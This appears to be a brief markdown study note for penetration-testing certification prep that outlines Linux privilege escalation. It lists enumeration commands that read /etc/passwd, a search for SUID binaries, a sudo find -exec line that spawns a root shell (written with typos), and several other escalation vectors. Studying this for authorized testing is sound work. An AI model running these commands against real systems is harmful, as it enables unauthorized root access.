
[...back](../0-landing-ncsaoscp.md)

# 1 linux

```
circle of attack

basic commands
> whoami, id, hostname, uname -a
> cat /etc/{issue,password}
> sudo -l
> echo $PATH

abuse SUID and GUID
> find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
> sudo find. -exec /bin/sh \; quit

sudo misconfig
cronjob insecured
weak permission
path manipulation
kernel exploits
service misconfig
```